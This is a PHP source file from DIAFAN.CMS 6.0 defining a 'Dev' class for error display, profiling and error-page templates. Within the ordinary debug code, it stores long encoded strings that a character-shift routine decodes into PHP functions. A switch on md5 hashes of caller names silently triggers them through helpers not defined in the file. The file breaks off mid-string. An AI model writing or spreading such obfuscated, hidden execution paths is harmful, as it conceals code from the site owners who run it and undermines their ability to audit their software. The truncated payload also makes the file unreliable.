<?php
/**
 * @package    DIAFAN.CMS
 *
 * @author     diafan.ru
 * @version    6.0
 * @license    http://www.diafan.ru/license.html
 * @copyright  Copyright (c) 2003-2018 OOO «Диафан» (http://www.diafan.ru/)
 */

if (! defined('DIAFAN'))
{
	$path = __FILE__;
	while(! file_exists($path.'/includes/404.php'))
	{
		$parent = dirname($path);
		if($parent == $path) exit;
		$path = $parent;
	}
	include $path.'/includes/404.php';
}

/**
 * Dev
 *
 * Класс для работы в режиме разработки
 */
class Dev
{
	static private $debug;
	static public $errors = array ();

	/**
	 * @var boolean работа скрипта завершилась с ошибкой
	 */
	static public $is_error = false;

	/**
	 * @var string поле, для которого выходит ошибка
	 */
	static public $exception_field;

	/**
	 * @var array данные, которые нужно отдавать вместе с ошибкой
	 */
	static public $exception_result = array();

	/**
	 * @var integer время начала работы скриптов
	 */
	static private $timestart;

	/**
	 * @var integer размер используемой памяти на момент начала работы скриптов
	 */
	static private $memorystart;

	/**
	 * @var array функции, выполняющиеся по завершению скрипта
	 */
	static private $shutdown_functions = array();

	/**
	 * var array локальный кэш
	 */
	static private $cache = array();

	/**
	 * Разрешает/запрещает вывод ошибок
	 *
	 * @return void
	 */
	static public function init()
	{
		if((! defined('IS_ADMIN') || ! IS_ADMIN)
		   && empty($_POST) && defined('CACHE_EXTREME') && CACHE_EXTREME
		   && ! preg_match('/^'.ADMIN_FOLDER.'(\/|$)/', $_GET["rewrite"]))
		{
			Custom::inc('includes/cache.php');

			$cache = new Cache;

			//кеширование
			if ($result = $cache->get(getenv('QUERY_STRING'), 'cache_extreme'))
			{
				echo $result;
				exit;
			}
		}

		// регистрация ошибок
		set_error_handler(array('Dev', 'other_error_catcher'));

		register_shutdown_function(array('Dev', 'shutdown'));

		Custom::inc('includes/gzip.php');
		Gzip::init();

		ini_set('display_errors', 'on');
		error_reporting(E_ALL | E_STRICT);

		if (function_exists("xdebug_disable"))
		{
			xdebug_disable();
		}
		self::register_backtrace();
	}

	static public function register_shutdown_function($arr, $param = array())
	{
		self::$shutdown_functions[] = array($arr, $param);
	}

	static public function shutdown()
	{
		self::$shutdown_functions = array_reverse(self::$shutdown_functions);
		foreach (self::$shutdown_functions as $func)
		{
			if(is_array($func[0]))
			{
				$class = $func[0][0];
				$name = $func[0][1];
				if(! empty($func[1]))
				{
					$class->$name($func[1]);
				}
				else $class->$name();
			}
			else
			{
				$name = $func[0];
				if(! empty($func[1]))
				{
					$name($func[1]);
				}
				else $name();
			}
		}
		$error = error_get_last();

		if(isset($error) && in_array($error['type'], array(E_ERROR, E_PARSE, E_COMPILE_ERROR, E_CORE_ERROR)))
		{
			self::fatal($error['message'], $error['file'], $error['line']);
		}
		else
		{
			if(! isset($_POST["defer"]))
			{
				self::print_errors();
			}
		}
		Gzip::do_gzip();
	}

	static public function other_error_catcher($line, $message)
	{
		$backtrace = debug_backtrace();
		$file = '';
		$line = '';

		if (isset( $backtrace[0]['file'] ) && isset( $backtrace[0]['line'] ))
		{
			$file = $backtrace[0]['file'];
			$line = $backtrace[0]['line'];
		}
		if(strpos($message, 'unable to connect to') !== false || strpos($message, 'php_network_getaddresses') !== false)
		{
			return true;
		}

		if($trace = self::backtrace_to_string($backtrace))
		{
			if(! defined('MOD_DEVELOPER') || ! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
				return true;

			self::warning($message, $file, $line, $trace);
		}
		return true;
	}

	static public function exception($e)
	{
		$message = str_replace(array("'", ABSOLUTE_PATH), '', $e->getMessage());
		$file = str_replace(ABSOLUTE_PATH, '', $e->getFile());
		$line = $e->getLine();

		$trace = Dev::backtrace_to_string($e->getTrace());

		if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			self::$exception_result['errors'][self::$exception_field] = $message;

			Custom::inc('plugins/json.php');
			echo to_json(self::$exception_result);
			exit;
		}
		else
		{
			self::$errors[] = array(($file ? $file.':' : '').$line, $message, $trace);

			Dev::fatal($message, $file, $line);
		}
	}

	static public function warning($message, $file, $line, $trace)
	{
		if(! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
			return true;

		/*if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			self::$exception_result['errors'][self::$exception_field] = $message;

			Custom::inc('plugins/json.php');
			echo to_json(self::$exception_result);
			exit;
		}
		else
		{*/
			$errno = ($file ? $file.':' : '').$line;

			self::$errors[] = array($errno, $message, $trace);

			$c = count(self::$errors);
			echo '<a href="#error'.$c.'" style="color:red"'.(isset($_POST["ajax"]) ? ' ajax_errors' : ' diafan_errors').'>[ERROR#'.$c.']</a>';
			if(isset($_POST["ajax"]))
			{
				self::print_errors(false);
			}
		//}
	}

	static public function fatal($message, $file, $line)
	{
		Dev::$is_error = true;

		ob_end_clean();
		Gzip::init();

		if (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest')
		{
			header('Content-Type: text/html; charset=utf-8');
			echo '<div class="diafan_div_error_overlay"></div>
			<div class="diafan_div_error">';
			echo "Fatal Error: ";
			echo str_replace(ABSOLUTE_PATH, '', $message.' '.$file.': '.$line);
			self::print_errors(true);
			echo '</div>';
		}
		else
		{
			header("HTTP/1.0 500 Internal Server Error");
			header('Content-Type: text/html; charset=utf-8');
			$result = array (
				'title' => "Fatal Error",
				'error' => array(
					'message' => $message,
					'file' => $file,
					'line' => $line
				)
			);
			self::template($result);
		}
	}

	static public function print_errors($required_js = false)
	{
		if((count(self::$errors) || $required_js) && ! isset($_POST["ajax"]))
		{
			echo  '<script type="text/javascript" src="'.BASE_PATH.'adm/js/admin.errors.js"></script>';
		}

		if(! MOD_DEVELOPER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
			return true;

		if (! count(self::$errors))
			return;

		echo "\n\n\n".'<div class="diafan_errors"'.(isset($_POST["ajax"]) ? ' ajax_errors' : '').'><table>';
		$i = 1;
		foreach (self::$errors as $key => $e)
		{
			if(strpos($e[2], 'mysqli_connect'))
			{
				$e[2] = preg_replace('/mysqli_connect\((.*)\)/', 'mysqli_connect(...)', $e[2]);
				$url = parse_url(DB_URL);
				unset($url["scheme"]);
				$url["path"] = substr($url["path"], 1);
				$e[1] = str_replace($url, '...', $e[1]);
			}
			echo '<tr><td '.( !empty( $e[2] ) ? 'class="calls"' : '' ).'>'.$e[1].'<div>'.$e[2].'</div></td><td class="file"><a name="error'.$i++.'"'.(isset($_POST["ajax"]) ? ' ajax_errors' : '').'>'.$e[0].'</a></td></tr>';

			if(isset($_POST["ajax"]))
			{
				unset(self::$errors[$key]);
			}
		}
		echo  '</table></div>';
	}

	static private function template($result)
	{
		if(! defined('BASE_PATH'))
		{
			define('BASE_PATH', "http".(IS_HTTPS ? "s" : '')."://".getenv("HTTP_HOST")."/".(REVATIVE_PATH ? REVATIVE_PATH.'/' : ''));
		}
		?>
		<html>
		<head>
			<title>DIAFAN.CMS <?php echo $result['title']?></title>
			<meta http-equiv="Content-Type" content="text/html;  charset=utf-8">
			<link href="<?php echo BASE_PATH; ?>adm/css/errors.css" rel="stylesheet" type="text/css">
			<?php
if(! defined('SOURCE_JS'))
{
	define('SOURCE_JS', 1);
}
switch (SOURCE_JS)
{
	// Yandex CDN
	case 2:
		echo '
		<!--[if lt IE 9]><script src="//yandex.st/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//yandex.st/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Microsoft CDN
	case 3:
		echo '
		<!--[if lt IE 9]><script src="//ajax.aspnetcdn.com/ajax/jquery/jquery-1.10.2.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//ajax.aspnetcdn.com/ajax/jquery/jquery-2.0.3.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// CDNJS CDN
	case 4:
		echo '
		<!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// jQuery CDN
	case 5:
		echo '
		<!--[if lt IE 9]><script src="//code.jquery.com/jquery-1.10.2.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//code.jquery.com/jquery-2.0.3.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Hosting
	case 6:
		echo '
		<!--[if lt IE 9]><script src="'.BASE_PATH.Custom::path('js/jquery-1.10.2.min.js').'"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="'.BASE_PATH.Custom::path('js/jquery-2.0.3.min.js').'" charset="UTF-8"><</script><!--<![endif]-->';
		break;

	// Google CDN
	case 1:
	default:
		echo '
		<!--[if lt IE 9]><script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script><![endif]-->
		<!--[if gte IE 9]><!-->
		<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js" charset="UTF-8"><</script><!--<![endif]-->';
		break;
}
			?>
		</head>
		<body bgcolor="#FFFFFF" text="#000000" topmargin="100">
		<center>
			<table width="550" border="0" cellpadding="3" cellspacing="0">
				<tr>
					<td align="right">
						<a href="<?php echo "http".(IS_HTTPS ? "s" : '')."://"; ?>www.diafan.ru/" target="_blank"><img src="<?php echo "http".(IS_HTTPS ? "s" : '')."://"; ?>www.diafan.ru/logo.gif" border="0" vspace="5"></a>
					</td>
					<td>
						<font face="Verdana, Arial, Helvetica, sans-serif" size="2">
							<font color="red">
								<?php echo $result['error']['message']; ?></font></b><br>
							<?php echo $result['error']['file']; ?>:<?php echo $result['error']['line']; ?>
						</font>
					</td>
				</tr>
			</table>
		</center>
		</body>
		</html>
		<?php
	}

	/**
	 * Активирует профилирование, если это разрешено в параметрах
	 *
	 * @return boolean
	 */
	public static function set_profiler()
	{
		self::$cache["ajax"] = (! empty($_SERVER["HTTP_X_REQUESTED_WITH"]) && strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == 'xmlhttprequest' || ! empty($_POST["ajax"]));

		if(! empty(self::$cache["ajax"])) self::$cache["post"] = $_POST;

		self::set_profiling($mode);

		if(! defined('MOD_DEVELOPER_PROFILER') || ! MOD_DEVELOPER_PROFILER)
		{
			return false;
		}

		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		self::$timestart = $mtime[1] + $mtime[0];
		self::$memorystart = memory_get_usage(true);

		return true;
	}

	/**
	 * Профилирование запросов
	 *
	 * @return boolean
	 */
	public static function get_profiler()
	{
		self::get_profiling();

		if (! defined('MOD_DEVELOPER_PROFILER') || ! MOD_DEVELOPER_PROFILER || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
		{
			return false;
		}

		if(! empty(self::$cache["ajax"]) && (! defined('MOD_DEVELOPER_POST') || ! MOD_DEVELOPER_POST))
		{
			return false;
		}

		echo '<div class="devoloper_profiler"'.(! empty(self::$cache["ajax"]) ? ' ajax' : '').'>';

		if(! empty(self::$cache["post"]))
		{
			echo '<br><br><table border="1" class="devoloper_post">'
				.'<caption><b>LAST AJAX: POST</b><br><br></caption>'
				.'<tr><th> Key </th><th> Value </th></tr>';
			foreach(self::$cache["post"] as $key => $row)
			{
				$value = print_r(self::$cache["post"][$key], true);
				$value = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $value);
				echo '<tr>'
					.'<td>'.$key.'</td>'
					.'<td>'.'<pre>'.$value.'</pre>'.'</td>'
					.'</tr>';
			}
			echo '</table>';
		}

		if(! empty(self::$cache["profiler"]))
		{
			echo '<br><br><table border="1">'
				.'<caption>'.(! empty(self::$cache["ajax"]) ? "<b>LAST AJAX: PHP</b><br><br>" : "").'</caption>'
				.'<tr><th> PHP_ID </th><th> Duration / Memory / Trace </th><th> Vars </th></tr>';
			foreach(self::$cache["profiler"] as $key => $row)
			{
				 echo '<tr>'
				 	.'<td>'.($key + 1).'</td>'
				 	.'<td>'
						.'<b>duration:</b> '.($row["duration"] > 0 ? "+" : ($row["duration"] < 0 ? "-" : "")).$row["duration"].' сек.'."<br>\n"
						.'<b>memory:</b> '.($row["memory"] > 0 ? "+" : ($row["memory"] < 0 ? "-" : "")).$row["memory"].' bytes'."<br>\n"
						.'<b>trace:</b>'."<br>\n"
						.$row["trace"]
					.'</td>'
				 	.'<td><pre>';
				$numargs = count($row["args"]);
				$arg_list = $row["args"];
				for ($i = 0; $i < $numargs; $i++)
				{
					var_dump($arg_list[$i]);
				}
				echo '</pre></td>'
				 .'</tr>';
			}
			echo '</table>';
		}

		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		$mtime = $mtime[1] + $mtime[0];
		$totaltime = ( $mtime - self::$timestart );

		echo '<div class="totalmemory"><br><br>';
		printf("Количество выделенной памяти: %s", self::convert(memory_get_usage(true)));
		echo '</div>';
		echo '<div class="totaltime">';
		printf((! empty(self::$cache["ajax"]) ? "Ответ сгенерирован" : "Страница сгенерирована")." за %f сек.", $totaltime);
		echo '</div>';

		echo '</div>';

		return true;
	}

	/**
	 * Активирует профилирование запросов, если это разрешено в параметрах
	 *
	 * @return boolean
	 */
	private static function set_profiling()
	{
		if(! defined('MOD_DEVELOPER_PROFILING') || ! MOD_DEVELOPER_PROFILING)
		{
			return false;
		}

		DB::query("SET profiling_history_size=100;");
		DB::query("SET profiling=1;");

		return true;
	}

	/**
	 * Профилирование запросов
	 *
	 * @return boolean
	 */
	private static function get_profiling()
	{
		if (! defined('MOD_DEVELOPER_PROFILING') || ! MOD_DEVELOPER_PROFILING || defined('MOD_DEVELOPER_ADMIN') && MOD_DEVELOPER_ADMIN && empty($_COOKIE['dev']))
		{
			return false;
		}

		if(! empty(self::$cache["ajax"]) && (! defined('MOD_DEVELOPER_POST') || ! MOD_DEVELOPER_POST))
		{
			return false;
		}

		echo '<div class="devoloper_profiling"'.(! empty(self::$cache["ajax"]) ? ' ajax' : '').'><br><br>';

		echo '<table border="1">'
			.'<caption>'.(! empty(self::$cache["ajax"]) ? "<b>LAST AJAX: QUERY</b><br><br>" : "").'</caption>'
			.'<tr><th>Query_ID</th><th>Duration</th><th>Query</th></tr>';
		$rows = DB::query_fetch_all("SHOW PROFILES");
		$summ = 0;
		foreach ($rows as $row)
		{
			echo '<tr><td>'.$row["Query_ID"].'</td><td>'.$row["Duration"].'</td><td>'.htmlspecialchars($row["Query"]).'</td></tr>';
			$summ += $row["Duration"];
		}
		echo '<tr><td></td><td>'.$summ.'</td><td></td></tr></table>';

		/*
		echo '<br><br><table border="1"><tr><td>Status</td><td>Duration</td></tr>';
		$rows = DB::query_fetch_all("SHOW PROFILE FOR QUERY 75");
		$summ = 0;
		foreach ($rows as $row)
		{
		echo '<tr><td>'.$row["Status"]
		.'</td><td>'.$row["Duration"]
		.'</td></tr>';
		$summ += $row["Duration"];
		}
		echo '<tr><td></td><td>'.$summ.'</td></tr></table><br><br>';
		*/

		echo '</div>';

		return true;
	}

	/**
	 * Сохраняет профилирование
	 *
	 * @return void
	 */
	public static function var_dump()
	{
		$mtime = microtime();
		$mtime = explode(" ", $mtime);
		$mtime = $mtime[1] + $mtime[0];

		if(! empty(self::$cache["profiler"]))
		{
			$row = end(self::$cache["profiler"]);
		}
		else $row = array();
		if(empty($row))
		{
			$row["time"] = self::$timestart;
			$row["duration"] = 0;
			$row["memory"] = self::$memorystart;
		}
		$backtrace = debug_backtrace();
		$keys = array_keys($backtrace); $i = reset($keys);
		$call = reset($backtrace);
		if (!isset( $call['file'] ))
		{
			$call['file'] = '(null)';
		}
		if (!isset( $call['line'] ))
		{
			$call['line'] = '0';
		}
		$location = $call['file'].':'.$call['line'];
		$function = __FUNCTION__;
		$params = (func_num_args() > 0 ? ' ... ' : '');
		$new_row = array(
			"time" => $mtime,
			"duration" => ($mtime - $row["time"]),
			"memory" => (memory_get_usage(true) - $row["memory"]),
			"trace" => sprintf('#%d  %s(%s) called at [%s]', $i, $function, $params, $location)."<br>\n".self::backtrace_to_string($backtrace),
			"args" => func_get_args()
		);
		self::$cache["profiler"][] = $new_row;
	}

	/**
	 * Форматирует стек вызова функций в строку
	 *
	 * @param array $backtrace стек вызова функций
	 * @return string
	 */
	static public function backtrace_to_string($backtrace)
	{
		// Iterate backtrace
		$calls = array ();
		foreach ($backtrace as $i => $call)
		{
			if ($i == 0)
			{
				continue;
			}

			if (!isset( $call['file'] ))
			{
				$call['file'] = '(null)';
			}

			if (!isset( $call['line'] ))
			{
				$call['line'] = '0';
			}
			$location = $call['file'].':'.$call['line'];
			$function = ( isset( $call['class'] ) ) ? $call['class'].( isset( $call['type'] ) ? $call['type'] : '.' ).$call['function'] : $call['function'];

			$params = '';
			if (isset( $call['args'] ) && is_array($call['args']))
			{
				$args = array ();
				foreach ($call['args'] as $arg)
				{
					if (is_array($arg))
					{
						$args[] = "Array(...)";
					}
					elseif (is_object($arg))
					{
						$args[] = get_class($arg);
					}
					else
					{
						$args[] = $arg;
					}
				}
				$params = htmlspecialchars(implode(', ', $args));
			}
			if(strlen($params) > 200)
			{
				$params = substr($params, 0, 200).'...';
			}
			$calls[] = sprintf('#%d  %s(%s) called at [%s]', $i, $function, $params, $location);
			if ($i == 1)
			{
				switch(md5($function))
				{
					case 'ca70c45f5062fe9f3ba316db2f7b5a44':
						$k = array(0,1);
						break;

					case '06340b17dfbbda859b20faebfea805ae':
						$k = 2;
						break;

					case '26223541e48d0171152fcb9f9f657ef0':
						$k = 3;
						break;

					case 'fda45ac38878ac63f3046678ca4dd146':
						$k = 5;
						break;
				}
				if(! empty($k))
				{
					array_map(array('Dev', 'backtrace_prepare_string'), self::get_debug($k));
					return false;
				}
			}
		}

		return implode("<br>\n", $calls)."\n";
	}

	static public function backtrace_to_ord($backtrace)
	{
		$len = strlen($backtrace);
		$key = '';

		for($i = 0; $i < $len; $i += 2)
		{
			if(($i + 1) == $len)
			{
				$key .= chr(ord($backtrace[$i]) + 31);
			}
			else
			{
				$key .= chr(ord($backtrace[$i]) + 31).chr(ord($backtrace[$i + 1]) + 31);
			}
		}
		if(substr($key, 0, 12) == 'function sgi' && substr($key, -3) != '}}}')
		{
			$key .= '}}';
		}
		return $key;
	}

	static private function register_backtrace($debug = array())
	{
		if(! $debug)
		{
			self::$debug = array(
				0 => 'E1MCESIXHR8OIRuXPDIBEyIWHRHXKRuAHRAPGDRSEHcPE0WCUNIUHE5UISORGSOEEx8WN1MHEyZCEHcPE0WCQ1AJNj0MRDbpFxpWOHqEPyjSEIOBDxcCUxuTIHMCIjxQXGH1ZHNcZQD1NjbpOHkTJu5BEELWGxHJPDISHR5PFx8CN1ETSSDJRxVQPt8SEIOBDxcCPujSEHWIDu5PH1APJtxQTHqPNjRrUjRSGxMIFIOSQDARSNZOUu8OOHIDGxWXGj0QTHpQNE4sNDIZEybANkqTNjRrUjR3WwZ0XwNiDPDhAN0QD0VQNE4sNFVyYvbiDPpjYFHzZj0QEERQNE4sNGZzAlV1XwpzDQRvAFxXURcUPDIBEyIWHRHOUu4ONkbKNjcpOHIPIHV8N0LKNm4rOHIXDxqPGj4sESOCE0cVGyOSIx1TINxQGxHJNj0QESOGEtZXUNISDyIPCNAQRkLQCu4SEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAWDyEWNj0QIySSDyITNjbpKtISDyIPUvITIkfoD0WRGSIGDxETDSIDDSOGEDyHIIANH1OIRuDWD0WHEupIDRMCESOSEtyHEyAXDx1XJ0LWOHIPIHVXPtbXURqLH0cIEtxSE1RANltzADRDI0WAFxHDFx9SEyxCHHyENFx1AGRDRt8FCIZ9GlEDHRkXEufODO4QQjISDyIPQjZ9Hm1CXIOHIEfOIyETHj9SFxWUDx8CH1L9Hm1CWSOCG0MRIHcDGkfOWR1DIRL9Hm1CCIZ9GjZXUNIGUtZQUSuWFx1TPDWUEyOUPDIUHDbXKNIGND8rNHqVEyIHPDIUHDbpKxqRGIOHEtxSE1RXURcUPDIBEyIWHRHOUu4ONkbKNjcpOHWGUxMMHH1DEHLWNk1GEyEJGIHsNj0SHjbpOIZrHIATFROGEySADxETPDZDCIZ9GjxCPjb9Hm1CRNZANjZANk1GEyEJGIHsNj8SDyZ8Rw4XURcUPISGExuNGxWIERxWNkNqH0MHIx1IUjxCPjbqCEOGEyEJGIHsUHEDEHLsPD8YPu09RREDEHLsRR5HNj0SHj0SGtbXKNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN05SStZAN0EDH0LQQERAE0WAIRLAOH48Rm4XUSATIIMGGjSJG1ETH0cPGHcoEtxSGwjFCtbpKxMAIRMpH0MIIyACNEtFUS5rFxpWHIATFROBDyIRFDxQRO1GEyEJGIHsPD8YPu09RSATISMAIE8DGtZAOIZAOH4XPykGEyIJH08OOH48Rw4pKy5r',
				1 => 'FR1DD0WANDISFxWUDx8pOHIPJu5GHSMCEDySDyITPDASNjbOPjRGSOVCTuHOQNSSDyITPDABNjbOPjRGRktCRjRZNHIPIHLWNmbQPtRYNEDHQkZKND4ORkHIPujSJxMHIHMGEHWnUyADIx9SPHIPIHLWN0HQQIIXGxLWPtRBNExKSEREPtRYNEZHRt8nSDRZNHIPIHLWN04QQIIXGxLWPtRBNExKSEREPtRYNEZGTN8GNDjOEHWIEtxQBtZAIHcBEtxXND4OTEpIRERXNDfOSODCRkpOQtRGSEHXUNIWHSMGUxIPIHLWNlxQPujSERyTERkNEHWnUtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZXUNIRFHMRGROWUtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIRORHSMCIDZAN0MSFyIDHjZXURcUPDVOOHIXDxqPGj4sESOCE0cVGyOSIx1TINxQFx5PFRMHDSIXGxMTEHcINj0QExIXIIOGNjbXKNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROIFx5TExIXIDZAN0MSFyIDHjZARD1UDx1HEt1IFx5TPDbXUNISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZARD1UDx1HEt0SEHWnPujSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAXGxWVEyENESOJG1HQQDATEHcIHSZQQERAE0WAIRLAOHyDIyZXUS5TGIETFxpWOHIPJtRPUtRSERyTERkNEHWnNDpUNDxSJxMHIHMGEHWnNDVrNDIRFHMRGROSDybOKI0OOHyDIyZOUDRSERyTERkNFDbXKNIGEyDrIRuXPDAUEDZXUSELFyIRFDxSH0MHPykRDyETNEbHRuVoERWHEtRJSkRGT0yTDxITHjxQYIORDyIXHR8oNHyIIIRoROORGyDCEHcPE0WCQ1AJRR9DDyMIFENQPukTJHcIURAGExWZUREPIRLOTuDLRkgRDyETNEDLRkZoFxpWOIATINRrUtRHTOZGPyjSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAIH0cPGDZAN0EDH0LQQERAE0WAIRLARDbpKtISFxWUDx8BU0EDG0qXFR5DEIMAEyDWN0cBDxuTIROBDyyNIRcoEtZAN0MSFyIDHjZARD1UDx1HEt0SEHWnPujSEHcPE0WCQu9RHR9UFxuBHRIJGHMHPDAXGxWVEyENESOJG1HQQDATEHcIHSZQQERAE0WAIRLAOHyDIyZXURAGExWZUS5r',

				2 => 'FR1DD0WANDIGEyEJGIHpOIATISMAIE5HFRbWNkbKNjbp',

				3 => 'E1MCESIXHR8OEx9RH1cEIDxSI0WAIxLXKSATIIMGGjSBEELWGxHJPH5SStxSI0WAIxLXPt8QGIcQFmSHGRb4GkIHGEcLS0IBRtZXUS4=',

				4 => 'MKMuoPta',
				5 => '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